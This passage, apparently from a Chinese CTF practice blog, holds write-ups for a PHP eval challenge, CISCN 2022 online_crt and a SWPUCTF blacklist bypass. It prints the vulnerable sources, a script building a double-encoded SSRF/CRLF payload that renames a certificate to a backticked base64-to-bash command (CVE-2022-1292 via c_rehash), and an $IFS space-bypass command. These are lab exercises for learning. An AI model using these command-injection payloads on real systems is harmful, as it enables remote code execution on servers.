class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);   <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);  <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;  <br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-variable">$hhh </span>= @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];  <br>  <br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(!<span class="hljs-variable">$hhh</span>)&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br>&#125;  <br>  <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);  <br>&#125;  <br>  <br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);  <br>  <br><span class="hljs-variable">$character_type </span>= <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);  <br>  <br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>未被过滤的字符有：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">!#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="21-CISCN-2022-初赛-online-crt">21 [CISCN 2022 初赛]online_crt</h2>
+<h3 id="Secure-Sockets-Layer-SSL">Secure Sockets Layer (SSL)</h3>
+<p><strong>安全套接层</strong> 是一种安全协议，又称 <strong>TLS</strong> (<strong>T</strong>ransport <strong>L</strong>ayer <strong>S</strong>ecurity, 传输层安全协议)</p>
+<h3 id="源码">源码</h3>
+<p>NSS上的这篇wp很好：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3018">文章 - [CISCN 2022 初赛]online_crt stoocea的WriteUp | NSSCTF</a></p>
+<p>本题涉及的漏洞是 CVE-2022-1292 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11149">CVE-2022-1292的分析-先知社区</a>。</p>
+<p>下面写了我自己的理解。</p>
+<p><a target="_blank" rel="noopener" href="http://app.py">app.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> cryptography <span class="hljs-keyword">import</span> x509<br><span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> hashes, serialization<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> rsa<br><span class="hljs-keyword">from</span> cryptography.x509.oid <span class="hljs-keyword">import</span> NameOID<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_crt</span>(<span class="hljs-params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):<br>    root_key = rsa.generate_private_key(<br>        public_exponent=<span class="hljs-number">65537</span>,<br>        key_size=<span class="hljs-number">2048</span>,<br>        backend=default_backend()<br>    )<br>    subject = issuer = x509.Name([<br>        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),<br>        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),<br>        x509.NameAttribute(NameOID.LOCALITY_NAME, City),<br>        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),<br>        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),<br>        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),<br>    ])<br>    root_cert = x509.CertificateBuilder().subject_name(<br>        subject<br>    ).issuer_name(<br>        issuer<br>    ).public_key(<br>        root_key.public_key()<br>    ).serial_number(<br>        x509.random_serial_number()<br>    ).not_valid_before(<br>        datetime.datetime.utcnow()<br>    ).not_valid_after(<br>        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="hljs-number">3650</span>)<br>    ).sign(root_key, hashes.SHA256(), default_backend())<br>    crt_name = <span class="hljs-string">&quot;static/crt/&quot;</span> + <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">&quot;.crt&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(crt_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(root_cert.public_bytes(serialization.Encoding.PEM))<br>    <span class="hljs-keyword">return</span> crt_name<br><br><span class="hljs-comment"># route 即 路由；我先理解为一个目录对应一个route</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-comment"># 规定了表单中信息的默认值 - CN a a a a a</span><br><span class="hljs-comment"># 配合 get_crt() 函数生成 x509 证书。</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getcrt&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    Country = request.form.get(<span class="hljs-string">&quot;Country&quot;</span>, <span class="hljs-string">&quot;CN&quot;</span>)<br>    Province = request.form.get(<span class="hljs-string">&quot;Province&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    City = request.form.get(<span class="hljs-string">&quot;City&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    OrganizationalName = request.form.get(<span class="hljs-string">&quot;OrganizationalName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    CommonName = request.form.get(<span class="hljs-string">&quot;CommonName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    EmailAddress = request.form.get(<span class="hljs-string">&quot;EmailAddress&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/createlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():<br>    json_data = &#123;<span class="hljs-string">&quot;info&quot;</span>: os.popen(<span class="hljs-string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;<br>    <span class="hljs-keyword">return</span> json.dumps(json_data)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy</span>():<br>    uri = request.form.get(<span class="hljs-string">&quot;uri&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    client = socket.socket()<br>    <span class="hljs-comment"># golang运行在8887端口上。这里flask与go代码交互。</span><br>    client.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8887</span>))<br>    <span class="hljs-comment"># 这里手动拼接了一个原始的 HTTP request</span><br>    <span class="hljs-comment"># 注入点应该在 uri</span><br>    msg = <span class="hljs-string">f&#x27;&#x27;&#x27;GET <span class="hljs-subst">&#123;uri&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: test_api_host</span><br><span class="hljs-string">User-Agent: Guest</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># 默认使用 utf8 编码。不重要。</span><br>    client.send(msg.encode())<br>    data = client.recv(<span class="hljs-number">2048</span>)<br>    client.close()<br>    <span class="hljs-keyword">return</span> data.decode()<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure>
+<p>main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>    <span class="hljs-string">&quot;os&quot;</span><br>    <span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    staticPath := <span class="hljs-string">&quot;/app/static/crt/&quot;</span><br>    oldname := c.DefaultQuery(<span class="hljs-string">&quot;oldname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    newname := c.DefaultQuery(<span class="hljs-string">&quot;newname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> oldname == <span class="hljs-string">&quot;&quot;</span> || newname == <span class="hljs-string">&quot;&quot;</span> || strings.Contains(oldname, <span class="hljs-string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>        c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>        err := os.Rename(staticPath+oldname, staticPath+newname)<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        c.String(<span class="hljs-number">200</span>, newname)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello world&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    router := gin.Default()<br>    router.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>    router.GET(<span class="hljs-string">&quot;/admin/rename&quot;</span>, admin)<br><br>    <span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">&quot;:8887&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>在这个环境中，go服务运行在<code>8887</code>端口，python服务运行在<code>8888</code>端口。</p>
+<h3 id="Golang">Golang</h3>
+<p>为了研究 golang 的一些语言特性，我需要在 vscode 中简单的配置环境。</p>
+<p>在 golang 官网下载msi安装器后，golang 的 bin 会被自动添加到环境 PATH 中。</p>
+<p>初始化项目：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">go mod init helloworld<br><span class="hljs-built_in">type</span> go.mod<br></code></pre></td></tr></table></figure>
+<p>编译并运行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">go run main.go<br></code></pre></td></tr></table></figure>
+<p>为当前项目安装 gin 库：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">go get github.com/gin-gonic/gin<br></code></pre></td></tr></table></figure>
+<h3 id="解题">解题</h3>
+<p>随便填入信息后，系统会提示我们生成了一个crt证书：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">static</span>/crt/afa18e05-<span class="hljs-number">40</span>cb-<span class="hljs-number">4</span>ca3-<span class="hljs-number">9</span>c12-<span class="hljs-number">55</span>daf5b73944.crt<br></code></pre></td></tr></table></figure>
+<p>我们要做的就是把该证书重命名为一段shell命令，来实现 RCE。</p>
+<h4 id="c-rehash"><code>c_rehash</code></h4>
+<p>这是一段perl脚本。由于我对perl一无所知，对shell也不熟悉。在这里就不瞎分析了。</p>
+<h4 id="RawPath">RawPath</h4>
+<p><a target="_blank" rel="noopener" href="https://pkg.go.dev/net/url#URL">url package - net/url - Go Packages</a><br>
+golang 的标准库 <code>net/url</code> 包中的 URL 结构体有一个 <code>RawPath</code> 字段：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> URL <span class="hljs-keyword">struct</span> &#123;<br>    ... <span class="hljs-comment">// 其他内容</span><br>    RawPath <span class="hljs-type">string</span> <span class="hljs-comment">// encoded path hint (see EscapedPath method)</span><br>    ... <span class="hljs-comment">// 其他内容</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>对于一个路径 <code>Path</code>，标准库的 URL 解析保留了两个字段：</p>
+<ul>
+<li>经过一次 URL 解码的路径 <code>Path</code></li>
+<li>原始路径 <code>RawPath</code></li>
+</ul>
+<p>只有当 <strong>经过一次解码后的 URL</strong> 和 <strong>原始 URL</strong> 不同时，<code>RawPath</code> 才会被设置。</p>
+<p>下面我在本地环境中的测试也证实了这一点（①传入的 URL 经过了一次编码，②经过了两次编码）：</p>
+<img src="/img/posts/003daily2601/260121_1.png" srcset="/img/loading.gif" lazyload />
+<blockquote>
+<p>注意：<strong>只要用 Go 标准库进行 Web 开发，<code>RawPath</code> 的这个特性就会存在。</strong> 此处因为题目中涉及 gin 框架，故使用了 gin 来复现。</p>
+</blockquote>
+<h4 id="修改文件名绕过">修改文件名绕过</h4>
+<p>再来看代码中的：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>    err := os.Rename(staticPath+oldname, staticPath+newname)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    c.String(<span class="hljs-number">200</span>, newname)<br>    <span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>要求 <code>RawPath</code> 为空。要满足此要求，只需 <strong>将 URL 进行两次编码</strong> 再传入即可。</p>
+<h4 id="Payload">Payload</h4>
+<p>用 Python 脚本来生成 payload（脚本来自 stoocea，就是 NSS 上写题解的那位）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>uri = <span class="hljs-string">&#x27;&#x27;&#x27;/admin%2frename?oldname=afa18e05-40cb-4ca3-9c12-55daf5b73944.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="hljs-string">Host: admin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>gopher = uri.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = urllib.parse.quote(gopher)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/admin<span class="hljs-variable">%252</span>frename<span class="hljs-variable">%3</span>Foldname<span class="hljs-variable">%3</span>Dafa<span class="hljs-number">18e05</span><span class="hljs-number">-40</span>cb<span class="hljs-number">-4</span>ca<span class="hljs-number">3</span><span class="hljs-number">-9</span><span class="hljs-keyword">c</span><span class="hljs-number">12</span><span class="hljs-number">-55</span>daf<span class="hljs-number">5</span>b<span class="hljs-number">73944</span>.crt<span class="hljs-variable">%26</span>newname<span class="hljs-variable">%3</span>D<span class="hljs-variable">%60</span>echo<span class="hljs-variable">%2520</span>Y<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IC<span class="hljs-number">8</span>qIA<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-variable">%7</span>Cbase<span class="hljs-number">64</span><span class="hljs-variable">%2520</span>--decode<span class="hljs-variable">%7</span>Cbash<span class="hljs-variable">%3</span>Eflag.txt<span class="hljs-variable">%60</span>.crt<span class="hljs-variable">%20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>AHost<span class="hljs-variable">%3</span>A<span class="hljs-variable">%20</span>admin<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<br></code></pre></td></tr></table></figure>
+<p>之后再访问 <code>/createlink</code> route，执行 <code>c_rehash</code> 命令，就可以触发我们的 RCE。</p>
+<h4 id="网站禁止-POST-请求？">网站禁止 POST 请求？</h4>
+<p>访问 <code>/proxy</code> route 时，需要用 POST 方法传入 <code>uri</code> 参数。但是题目环境似乎禁止了直接使用 POST 方法。</p>
+<p>只需要在burpsuite中拦截请求后，更改请求方式为 POST，再手动把报文的 POST 改成 GET 就可以啦。</p>
+<p>修改之后的 request 和 response 分别是这样：</p>
+<img src="/img/posts/003daily2601/260121_2.png" srcset="/img/loading.gif" lazyload />
+<h4 id="Flag">Flag</h4>
+<p>最终访问 <code>/static/crt/flag.txt</code> 获取所执行命令的输出，发现里面就有 flag：</p>
+<img src="/img/posts/003daily2601/260121_4.png" srcset="/img/loading.gif" lazyload width="500">
+<blockquote>
+<p>这道题的漏洞核心还是在 <strong><code>c_rehash</code></strong> 这个 perl 脚本上。有空一定要再来研究。</p>
+</blockquote>
+<h2 id="22-SWPUCTF-2021-新生赛-nc签到">22 [SWPUCTF 2021 新生赛]nc签到</h2>
+<p>简单的RCE。附件中有源代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;cd&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;$&#123;IFS&#125;&#x27;</span>]<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    command = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> command:<br>            exit(<span class="hljs-number">0</span>)<br>    os.system(command)<br></code></pre></td></tr></table></figure>
+<p>绕过黑名单即可。payload是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir # 显示当前目录的所有文件，发现有flag<br><span class="hljs-meta prompt_">tac$</span><span class="language-bash">IFS<span class="hljs-variable">$9flag</span> <span class="hljs-comment"># 使用 $IFS$9 代替空格；tac就是cat反过来</span></span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2601做题笔记</div>
+      <div>https://blog.huarun.moe/2026/02/02/2601做题笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>huarun</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              <a class="print-no-link" target="_blank" href="https://creativecommons.org/publicdomain/zero/1.0/">
+                <span class="hint--top hint--rounded" aria-label="CC0 - 无版权">
+                  <i class="iconfont icon-cc-zero"></i>
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/07/huarun&#39;s%202025%20%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" title="huarun&#39;s 2025年度总结">
+                        <span class="hidden-mobile">huarun&#39;s 2025年度总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
